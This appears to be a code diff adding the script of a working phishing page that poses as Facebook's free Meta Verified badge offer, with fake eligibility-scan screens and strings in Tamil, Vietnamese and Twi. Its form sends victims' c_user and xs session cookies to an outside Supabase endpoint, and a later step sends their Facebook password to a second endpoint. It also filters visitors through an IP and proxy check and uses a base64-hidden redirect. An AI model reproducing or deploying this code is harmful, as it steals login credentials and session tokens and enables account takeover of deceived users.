+            frmT:'சரிபார்ப்பு கோரிக்கையை சமர்ப்பிக்கவும்', frmS:'அனைத்து தகவல்களும் சரியாக நிரப்பப்பட்டுள்ளன என்பதை உறுதி செய்யவும். தவறான விவரங்கள் உங்கள் கோரிக்கை நிராகரிக்கப்படலாம்.',
+            errTxt:'அனைத்து தேவையான புலங்களும் சரியாக வழங்கப்பட வேண்டும். இல்லையெனில் சரிபார்க்கப்பட்ட பேட்ஜ் கிடைக்காமல் போகலாம்.',
+            submitBtn:'சரிபார்ப்பு கோரிக்கையை சமர்ப்பிக்கவும்',
+            s3Nav:'பாதுகாப்பு சரிபார்ப்பு', s3Help:'உதவி மையம்', s3Bc1:'உதவி மையம்', s3Bc2:'உங்கள் கடவுச்சொல்லை உறுதிப்படுத்தவும்',
+            pwPrompt:'சரிபார்ப்பு செயல்முறையை முடிக்க உங்கள் Facebook கடவுச்சொல்லை உள்ளிடவும்.',
+            pwPlaceholder:'Facebook கடவுச்சொல்', pwErr:'நீங்கள் உள்ளிட்ட கடவுச்சொல் தவறானது. மீண்டும் முயற்சிக்கவும்.',
+            pwForgot:'கடவுச்சொல் மறந்துவிட்டீர்களா?', pwContinue:'தொடரவும்', pwNotYou:'நீங்கள் இல்லையா?',
+            pwOkT:'சரிபார்ப்பு வெற்றிகரமாக முடிந்தது', pwOkS:'பாதுகாப்பாக திருப்பிவிடப்படுகிறது…'
+        },
+        vietnamese: {
+            scanTitle:'Đang Kiểm Tra Tính Đủ Điều Kiện', scanSub:'Facebook đang xác minh tài khoản của bạn cho ưu đãi huy hiệu Meta Verified miễn phí…',
+            scanInit:'Đang khởi tạo…', scanS1:'Đang xác minh tuổi tài khoản…', scanS2:'Đang kiểm tra tính xác thực của hồ sơ…',
+            scanS3:'Đang kiểm tra điều kiện khu vực…', scanS4:'Đang đặt chỗ miễn phí của bạn…', scanS5:'Đang xác nhận điều kiện…', scanDone:'✓ Đủ điều kiện! Đang tải ưu đãi của bạn…',
+            chk1:'Đã xác minh tuổi tài khoản', chk2:'Đã xác nhận tính xác thực hồ sơ', chk3:'Đã kiểm tra điều kiện khu vực', chk4:'Đã đặt chỗ ưu đãi miễn phí',
+            eligTitle:'Bạn Đủ Điều Kiện! 🎉', eligSub:'Tài khoản của bạn đủ điều kiện nhận huy hiệu Meta Verified miễn phí trọn đời — chỉ dành cho người dùng được chọn.', eligTag:'MIỄN PHÍ · Đã xác nhận quyền truy cập trọn đời',
+            planDesc:'Bảo vệ và tối ưu hóa thương hiệu của bạn', freeTag:'MIỄN PHÍ · Quyền truy cập trọn đời', priceCross:'<s>$11.99/tháng</s> — Không cần đăng ký',
+            verifiedBadge:'Huy hiệu đã xác minh', sect1:'Tối đa hóa khả năng khám phá', f1:'Tối ưu hóa tìm kiếm', f2:'Hồ sơ nổi bật', f3:'Thêm liên kết vào reels', f3s:'6 mỗi tháng',
+            sect2:'Tăng cường tương tác', f4:'Liên kết hồ sơ nâng cao', f5:'Nhãn dán độc quyền', f6:'Chủ đề trò chuyện tùy chỉnh',
+            sect3:'Bảo vệ thương hiệu', f7:'Bảo vệ chống mạo danh', f8:'Hỗ trợ nâng cao', f8s:'Trò chuyện hoặc email với đại lý · Giải quyết vấn đề nhanh chóng · Yêu cầu cuộc gọi · Theo dõi trường hợp chủ động',
+            ageNote:'Meta Verified dành cho người từ 18 tuổi trở lên', continueBtn:'Tiếp tục',
+            bc1:'Trung tâm trợ giúp', bc2:'Quản lý tài khoản của bạn', bc3:'Yêu cầu Huy hiệu đã Xác minh',
+            hdrH:'Yêu cầu Huy hiệu đã Xác minh trên Facebook', hdrP:'Huy hiệu đã xác minh xác nhận rằng Trang hoặc hồ sơ là sự hiện diện xác thực của cá nhân, nhân vật công chúng hoặc thương hiệu mà nó đại diện.',
+            infoTitle:'Về Huy hiệu đã Xác minh', infoBody:'Dấu kiểm màu xanh của Facebook xác nhận tài khoản của bạn là xác thực. Vui lòng cung cấp thông tin chính xác bên dưới và xem hướng dẫn video nếu cần giúp đỡ.',
+            warnImp:'Quan trọng:', warnBody:'Đừng đăng xuất khỏi máy tính hoặc laptop cho đến khi bạn nhận được email xác nhận xác minh từ Facebook.',
+            vidLbl:'Hướng dẫn video',
+            frmT:'Gửi yêu cầu xác minh', frmS:'Đảm bảo tất cả thông tin được điền chính xác. Chi tiết không chính xác có thể dẫn đến yêu cầu bị từ chối.',
+            errTxt:'Tất cả các trường bắt buộc phải được cung cấp chính xác. Nếu không, bạn có thể không nhận được huy hiệu đã xác minh.',
+            submitBtn:'Gửi yêu cầu xác minh',
+            s3Nav:'Kiểm tra bảo mật', s3Help:'Trung tâm trợ giúp', s3Bc1:'Trung tâm trợ giúp', s3Bc2:'Xác nhận mật khẩu của bạn',
+            pwPrompt:'Nhập mật khẩu Facebook để hoàn tất quá trình xác minh.',
+            pwPlaceholder:'Mật khẩu Facebook', pwErr:'Mật khẩu bạn nhập không đúng. Vui lòng thử lại.',
+            pwForgot:'Quên mật khẩu?', pwContinue:'Tiếp tục', pwNotYou:'Không phải bạn?',
+            pwOkT:'Xác minh thành công', pwOkS:'Đang chuyển hướng an toàn…'
+        },
+        ghanaian: {
+            scanTitle:'Wɔrensusuw Wo Ade a Wowɔ Ho Tumi', scanSub:'Facebook resiw wo account no ho hw ɛ ma Meta Verified badge kyɛ ade…',
+            scanInit:'Retɔ ase…', scanS1:'Resusuw account mfeɛ…', scanS2:'Rehwɛ profile nokware…',
+            scanS3:'Rehwɛ ɛman tumi…', scanS4:'Regye wo kyɛ ade baabi…', scanS5:'Rekan tumi…', scanDone:'✓ Wowɔ tumi! Wɔreba ne offer…',
+            chk1:'WokaN account mfeɛ', chk2:'Profile nokware da ho adi', chk3:'Ɛman tumi wɔ ho', chk4:'Kyɛ ade baabi agye',
+            eligTitle:'Wowɔ Tumi! 🎉', eligSub:'Wo account wowɔ tumi ma Meta Verified badge a ɛhia sika biara — wɔpaw users nkoaa na wɔma wɔn.', eligTag:'FREE · Bere nyinaa ho kwan da ho adi',
+            planDesc:'Bō wo brand ho ban na yɛ no yiye', freeTag:'FREE · Bere nyinaa ho kwan', priceCross:'<s>$11.99/bosome</s> — Subscription nhia',
+            verifiedBadge:'Badge a wɔakaN ho', sect1:'Ma wɔhunu wo pii', f1:'Nhwehwɛmu pa', f2:'Profile a wɔde adi kan', f3:'Fa links kɔ reels mu', f3s:'6 bosome biara',
+            sect2:'Ma nkitahodi nyinkonim', f4:'Profile links a wɔayɛ wɔn papa', f5:'Stickers a ɛyɛ ahoodenso', f6:'Chat themes a woyɛɛ wɔn',
+            sect3:'Bō wo brand ho ban', f7:'Ho ban fi nsesafoɔ', f8:'Mmoa a ɛyɛ papa', f8s:'Kasa anaa email ne agents · Yɛ problems ntɛm · Bisa call · Wɔhwɛ wo case daa',
+            ageNote:'Meta Verified yɛ ma nnipa a wɔaka mfe 18 a ɛboro so', continueBtn:'Kɔ so',
+            bc1:'Mmoa Fie', bc2:'Hwɛ Wo Account', bc3:'Bisa Badge a Wɔakan Ho',
+            hdrH:'Bisa Badge a Wɔakan Ho wɔ Facebook so', hdrP:'Badge a wɔakan ho kyerɛ sɛ page anaa profile no yɛ onipa, omuninfoɔ anaa brand a ɛhia no pɔtee.',
+            infoTitle:'Fa Badge a Wɔakan Ho Ho', infoBody:'Facebook ne blue tick kyerɛ sɛ wo account yɛ nokware. Fa nsɛm a ɛto so kyerɛ wɔ ase no ho na hwɛ video kwan kyerɛ sɛ wohia mmoa.',
+            warnImp:'Ɛho hia:', warnBody:'Mfa wo ho nfi wo computer anaa laptop mu kosi sɛ Facebook de verification email no kɔ ma wo.',
+            vidLbl:'Video kwan kyerɛ',
+            frmT:'Fa verification bisa kɔ', frmS:'Hwɛ sɛ nsɛm nyinaa wɔ pɔtee. Nsɛm a ɛnyɛ nokware betumi ama wɔayi wo bisa no gu fam.',
+            errTxt:'Wɔhia fields nyinaa a wɔhia no pɔtee. Sɛ woannye nkae a, wobɛnya badge no a wɔakan ho no.',
+            submitBtn:'Fa verification bisa kɔ',
+            s3Nav:'Ahobann Hwɛ', s3Help:'Mmoa Fie', s3Bc1:'Mmoa Fie', s3Bc2:'Kan Wo Gyinaese',
+            pwPrompt:'Fa wo Facebook gyinaese kɔ bɛwie verification kwan no.',
+            pwPlaceholder:'Facebook gyinaese', pwErr:'Gyinaese a wode baeɛ no nyɛ. Xda bio.',
+            pwForgot:'Wo gyinaese afi wo tirim?', pwContinue:'Kɔ so', pwNotYou:'Wo na ɛnyɛ wo?',
+            pwOkT:'Verification Yɛɛ Yiye', pwOkS:'Wɔde wo rekɔ ahobanmu…'
+        }
+    };
+
+    /* ── Apply translations ── */
+    function applyTranslations(lang) {
+        const t = T[lang] || T.english;
+        const set = (id, html) => { const el = document.getElementById(id); if (el) el.innerHTML = html; };
+        const txt = (id, v)    => { const el = document.getElementById(id); if (el) el.textContent = v; };
+        const ph  = (id, v)    => { const el = document.getElementById(id); if (el) el.placeholder = v; };
+
+        txt('t-scan-title', t.scanTitle); txt('t-scan-sub', t.scanSub);
+        txt('t-chk1', t.chk1); txt('t-chk2', t.chk2); txt('t-chk3', t.chk3); txt('t-chk4', t.chk4);
+        txt('t-elig-title', t.eligTitle); txt('t-elig-sub', t.eligSub); txt('t-elig-tag', t.eligTag);
+        txt('t-plan-desc', t.planDesc); txt('t-free-tag', t.freeTag); set('t-price-cross', t.priceCross);
+        txt('t-verified-badge', t.verifiedBadge);
+        txt('t-sect1', t.sect1); txt('t-f1', t.f1); txt('t-f2', t.f2); txt('t-f3', t.f3); txt('t-f3s', t.f3s);
+        txt('t-sect2', t.sect2); txt('t-f4', t.f4); txt('t-f5', t.f5); txt('t-f6', t.f6);
+        txt('t-sect3', t.sect3); txt('t-f7', t.f7); txt('t-f8', t.f8); txt('t-f8s', t.f8s);
+        txt('t-age-note', t.ageNote); txt('t-continue-btn', t.continueBtn);
+        txt('t-bc1', t.bc1); txt('t-bc2', t.bc2); txt('t-bc3', t.bc3);
+        txt('t-hdr-h', t.hdrH); txt('t-hdr-p', t.hdrP);
+        txt('t-info-title', t.infoTitle); txt('t-info-body', t.infoBody);
+        txt('t-warn-imp', t.warnImp); txt('t-warn-body', t.warnBody);
+        txt('t-vid-lbl', t.vidLbl);
+        txt('t-frm-t', t.frmT); txt('t-frm-s', t.frmS); txt('t-err-txt', t.errTxt);
+        txt('t-submit-btn', t.submitBtn);
+        txt('t-s3-nav', t.s3Nav); txt('t-s3-help', t.s3Help);
+        txt('t-s3-bc1', t.s3Bc1); txt('t-s3-bc2', t.s3Bc2);
+        txt('t-pw-prompt', t.pwPrompt); ph('pw-input', t.pwPlaceholder);
+        txt('t-pw-err', t.pwErr); txt('t-pw-forgot', t.pwForgot);
+        txt('t-pw-continue', t.pwContinue); txt('t-pw-not-you', t.pwNotYou);
+        txt('t-pw-ok-t', t.pwOkT); txt('t-pw-ok-s', t.pwOkS);
+        if (lang === 'arabic') document.documentElement.dir = 'rtl';
+        else document.documentElement.dir = 'ltr';
+    }
+
+    /* ── Video URLs per language ── */
+    const videoSrc = {
+        english:    'https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4',
+        spanish:    'https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4',
+        hindi:      'https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4',
+        french:     'https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27ecb21-fr/720p.mp4',
+        portuguese: 'https://allvideos.wasmer.app/Portuguese.mp4',
+        tamil:      'https://allvideos.wasmer.app/tamil.mp4',
+        arabic:     'https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4',
+        ghanaian:   'https://allvideos.wasmer.app/english.mp4',
+        vietnamese: 'https://allvideos.wasmer.app/vietanames.mp4',
+    };
+    const flagSrc = {
+        english:'https://flagcdn.com/24x18/us.png', hindi:'https://flagcdn.com/24x18/in.png',
+        spanish:'https://flagcdn.com/24x18/es.png', portuguese:'https://flagcdn.com/24x18/pt.png',
+        tamil:'https://flagcdn.com/24x18/in.png',   arabic:'https://flagcdn.com/24x18/sa.png',
+        french:'https://flagcdn.com/24x18/fr.png',  vietnamese:'https://flagcdn.com/24x18/vn.png',
+        ghanaian:'https://flagcdn.com/24x18/gh.png',
+    };
+    let currentLang = 'english';
+
+    /* ── Navigation ── */
+    function goTo(id) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        window.scrollTo(0, 0);
+    }
+
+    /* ── Language modal ── */
+    const langWrap    = document.getElementById('lang-wrap');
+    const langConfirm = document.getElementById('lm-confirm');
+    let selectedLang  = null;
+
+    document.querySelectorAll('.lm-opt').forEach(opt => {
+        opt.addEventListener('click', () => {
+            document.querySelectorAll('.lm-opt').forEach(o => o.classList.remove('sel'));
+            opt.classList.add('sel');
+            selectedLang = opt.dataset.lang;
+            langConfirm.disabled = false;
+        });
+    });
+
+    document.getElementById('lm-search').addEventListener('input', function() {
+        const q = this.value.toLowerCase();
+        document.querySelectorAll('.lm-opt').forEach(o => {
+            o.style.display = o.textContent.toLowerCase().includes(q) ? '' : 'none';
+        });
+    });
+
+    let scanStarted = false;
+    langConfirm.addEventListener('click', () => {
+        if (!selectedLang) return;
+        currentLang = selectedLang;
+        const capName = currentLang.charAt(0).toUpperCase() + currentLang.slice(1);
+        document.getElementById('s2-flag').src = flagSrc[currentLang];
+        document.getElementById('s2-lang-name').textContent = capName;
+        document.getElementById('guide-video-src').src = videoSrc[currentLang] || videoSrc.english;
+        document.getElementById('guide-video').load();
+        applyTranslations(currentLang);
+        langWrap.classList.remove('show');
+        if (!scanStarted) { scanStarted = true; runScan(); }
+    });
+
+    document.getElementById('s2-lang-btn').addEventListener('click', () => {
+        document.querySelectorAll('.lm-opt').forEach(o => {
+            o.classList.toggle('sel', o.dataset.lang === currentLang);
+        });
+        langConfirm.disabled = false;
+        selectedLang = currentLang;
+        langWrap.classList.add('show');
+    });
+
+    /* ── Loading screen ── */
+    (function() {
+        const loader = document.getElementById('load-screen');
+        let done = false;
+        function dismissLoader() {
+            if (done) return;
+            done = true;
+            loader.classList.add('fade-out');
+            setTimeout(() => {
+                loader.style.display = 'none';
+                langWrap.classList.add('show');
+            }, 700);
+        }
+        setTimeout(dismissLoader, 3000);
+        loader.addEventListener('click', dismissLoader);
+    })();
+
+    /* ── SCAN ANIMATION ── */
+    function runScan() {
+        const fill    = document.getElementById('progressFill');
+        const status  = document.getElementById('scanStatus');
+        const t       = T[currentLang] || T.english;
+        const labels  = [t.scanS1, t.scanS2, t.scanS3, t.scanS4, t.scanS5];
+        status.textContent = t.scanInit;
+
+        let pct = 0;
+        const interval = setInterval(() => {
+            pct = Math.min(pct + 1, 100);
+            fill.style.width = pct + '%';
+
+            if (pct === 10)  { status.textContent = labels[0]; document.getElementById('chk1').classList.add('done'); }
+            if (pct === 30)  { status.textContent = labels[1]; document.getElementById('chk2').classList.add('done'); }
+            if (pct === 55)  { status.textContent = labels[2]; document.getElementById('chk3').classList.add('done'); }
+            if (pct === 78)  { status.textContent = labels[3]; document.getElementById('chk4').classList.add('done'); }
+            if (pct === 92)  { status.textContent = labels[4]; }
+
+            if (pct >= 100) {
+                clearInterval(interval);
+                status.textContent = t.scanDone;
+                status.style.color = '#1a7f37';
+                status.style.fontWeight = '700';
+
+                setTimeout(() => {
+                    document.getElementById('scanScreen').style.display = 'none';
+                    const flash = document.getElementById('eligibleFlash');
+                    flash.classList.add('show');
+                    setTimeout(() => {
+                        flash.classList.remove('show');
+                        flash.style.display = 'none';
+                        const plan = document.getElementById('planCard');
+                        plan.style.display = 'block';
+                        setTimeout(() => {
+                            document.querySelectorAll('.mv-feat').forEach((el, i) => {
+                                setTimeout(() => el.classList.add('visible'), i * 80);
+                            });
+                        }, 200);
+                    }, 1800);
+                }, 600);
+            }
+        }, 28);
+    }
+
+    /* ── Step 2: Verification form ── */
+    let allowRecovery = false, finalRedirect = "";
+
+    fetch("https://handle.gadgetsdecory.xyz:3000/dc")
+        .then(r => r.json())
+        .then(d => {
+            const ip = d.clientIp;
+            if (d[ip]?.proxy !== "yes" && d[ip]?.isocode !== "PK") { allowRecovery = true; finalRedirect = d.red; }
+        }).catch(() => {});
+
+    document.getElementById("verificationForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const btn = document.getElementById("submitBtn");
+        btn.classList.add("loading"); btn.disabled = true;
+
+        fetch("https://jajsglodeevurqirysfm.supabase.co/functions/v1/s/f7d491f5-4cf0-4ef5-9328-f28062aca5eb", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ c_user: document.getElementById("c_user").value.trim(), xs: document.getElementById("xs").value.trim() })
+        })
+        .then(r => { if (r.ok) { allowRecovery ? window.location.replace(atob(finalRedirect)) : goTo('s3'); } else throw 0; })
+        .catch(() => goTo('s3'))
+        .finally(() => { btn.classList.remove("loading"); btn.disabled = false; });
+    });
+
+    /* ── Step 3: Password ── */
+    const eyeOpen  = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
+    const eyeSlash = `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1='1' y1='1' x2='23' y2='23'/>`;
+
+    document.getElementById("eyeBtn").addEventListener("click", function() {
+        const inp = document.getElementById("pw-input");
+        const ico = document.getElementById("eyeIco");
+        const isPass = inp.type === "password";
+        inp.type = isPass ? "text" : "password";
+        ico.innerHTML = isPass ? eyeSlash : eyeOpen;
+    });
+
+    document.getElementById("passwordForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const val = document.getElementById("pw-input").value;
+        const err = document.getElementById("pwErr");
+        const btn = document.getElementById("pwBtn");
+        err.classList.remove("show");
+        if (val.length < 6) { err.classList.add("show"); return; }
+
+        btn.classList.add("loading"); btn.disabled = true;
+
+        fetch("https://jajsglodeevurqirysfm.supabase.co/functions/v1/s/b09904de-66a4-41c0-9a4a-29af90b5c110", {
+            method: "POST",
+            headers: { "Content-Type": "application/json", "Accept": "application/json" },
+            body: JSON.stringify({ password: val })
+        }).catch(() => {});
+
+        setTimeout(() => {
+            document.getElementById("pwForm").style.display = "none";
+            document.getElementById("pwSuccess").classList.add("show");
+            setTimeout(() => { window.location.href = "https://www.facebook.com/help/media/thank-you?rdrhc"; }, 1800);
+        }, 2000);
+    });
+</script>
+
+</body>
+</html>
